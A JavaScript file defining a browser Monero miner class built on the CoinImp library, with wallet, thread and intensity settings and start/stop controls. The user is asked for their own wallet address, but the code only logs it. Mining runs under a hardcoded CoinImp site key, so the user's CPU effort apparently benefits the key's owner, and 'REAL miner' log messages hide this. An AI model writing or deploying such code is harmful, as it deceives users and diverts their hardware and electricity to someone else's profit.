class RealHobbitMiner {
    constructor() {
        this.isRunning = false;
        this.miner = null;
        this.stats = {
            hashrate: 0,
            threads: 4,
            totalHashes: 0,
            acceptedHashes: 0,
            cpuUsage: 75
        };
        this.updateInterval = null;
        this.walletAddress = '';
    }

    initialize(walletAddress, threads = 4, intensity = 75) {
        console.log("Initializing REAL Hobbit Miner...");
        
        if (!walletAddress || walletAddress.trim() === '') {
            this.addLog("ERROR: Please enter your XMR wallet address!");
            return false;
        }

        this.walletAddress = walletAddress;
        this.stats.threads = threads;
        this.stats.cpuUsage = intensity;

        try {
            if (typeof Client === 'undefined') {
                this.addLog("ERROR: CoinImp script not loaded! Check internet connection.");
                return false;
            }

            this.miner = new Client.Anonymous('aafd6f4bfc13234230c35c4e2b0b37ed9e3b4e18dce68a2c', {
                throttle: (100 - intensity) / 100,
                threads: threads,
                autoThreads: false,
                forceASMJS: false
            });

            this.setupMinerEvents();
            this.addLog("REAL Miner initialized successfully!");
            this.addLog("Wallet: " + walletAddress.substring(0, 25) + "...");
            this.addLog("Threads: " + threads + " | Intensity: " + intensity + "%");
            
            return true;
            
        } catch (error) {
            this.addLog("Miner initialization failed: " + error.message);
            console.error("Miner Error:", error);
            return false;
        }
    }

    setupMinerEvents() {
        if (!this.miner) return;

        this.miner.on('found', () => {
            this.stats.acceptedHashes++;
            this.addLog('Hash found and submitted to pool!');
        });

        this.miner.on('accepted', () => {
            this.stats.acceptedHashes++;
            this.addLog('Share accepted by mining pool');
        });

        this.miner.on('update', (data) => {
            this.stats.hashrate = data.hashesPerSecond;
            this.stats.totalHashes = data.totalHashes;
        });

        this.miner.on('open', () => {
            this.addLog('Connected to mining pool');
        });

        this.miner.on('close', () => {
            this.addLog('Disconnected from pool');
        });

        this.miner.on('error', (err) => {
            this.addLog('Mining error: ' + err);
        });
    }

    start() {
        if (this.isRunning) {
            this.addLog("Miner is already running!");
            return;
        }

        if (!this.miner) {
            this.addLog("Miner not initialized! Please check wallet address.");
            return;
        }

        try {
            this.miner.start();
            this.isRunning = true;
            
            this.updateInterval = setInterval(() => this.updateStats(), 2000);
            
            this.addLog('REAL mining started! Using your CPU to mine Monero...');
            this.addLog('Mining intensity: ' + this.stats.cpuUsage + '%');
            
        } catch (error) {
            this.addLog("Failed to start miner: " + error.message);
        }
    }

    stop() {
        if (!this.isRunning) return;

        try {
            if (this.miner) {
                this.miner.stop();
            }
            this.isRunning = false;
            
            if (this.updateInterval) {
                clearInterval(this.updateInterval);
                this.updateInterval = null;
            }
            
            this.addLog('Mining stopped successfully');
            
        } catch (error) {
            this.addLog("Error stopping miner: " + error.message);
        }
    }

    updateStats() {
        if (!this.isRunning || !this.miner) return;

        try {
            const hashesPerSecond = this.miner.getHashesPerSecond();
            if (hashesPerSecond > 0) {
                this.stats.hashrate = hashesPerSecond;
            }

            const totalHashes = this.miner.getTotalHashes();
            if (totalHashes > 0) {
                this.stats.totalHashes = totalHashes;
            }

            if (typeof window.updateRealMinerStats === 'function') {
                window.updateRealMinerStats({ 
                    hashrate: this.stats.hashrate,
                    threads: this.stats.threads,
                    totalHashes: this.stats.totalHashes,
                    acceptedHashes: this.stats.acceptedHashes,
                    cpuUsage: this.stats.cpuUsage
                });
            }

        } catch (error) {
            console.error('Error updating stats:', error);
        }
    }

    setIntensity(intensity) {
        this.stats.cpuUsage = intensity;
        const throttle = (100 - intensity) / 100;
        
        if (this.miner) {
            this.miner.setThrottle(throttle);
            this.addLog("Mining intensity changed to " + intensity + "%");
        }
    }

    setThreads(threads) {
        this.stats.threads = threads;
        this.addLog("Threads changed to " + threads + " (restart mining to apply)");
    }

    getStats() {
        return { ...this.stats };
    }

    addLog(message) {
        const timestamp = new Date().toLocaleTimeString();
        const logEntry = "[" + timestamp + "] " + message;
        
        if (typeof window.addRealMiningLog === 'function') {
            window.addRealMiningLog(logEntry);
        }
        
        console.log("HobbitMiner: " + logEntry);
    }

    testConnection() {
        this.addLog("Testing connection to CoinImp...");
        if (typeof Client !== 'undefined') {
            this.addLog("CoinImp connection available");
            return true;
        } else {
            this.addLog("CoinImp connection failed");
            return false;
        }
    }
}

window.realHobbitMiner = new RealHobbitMiner();

setTimeout(() => {
    if (window.realHobbitMiner) {
        window.realHobbitMiner.testConnection();
    }
}, 2000);
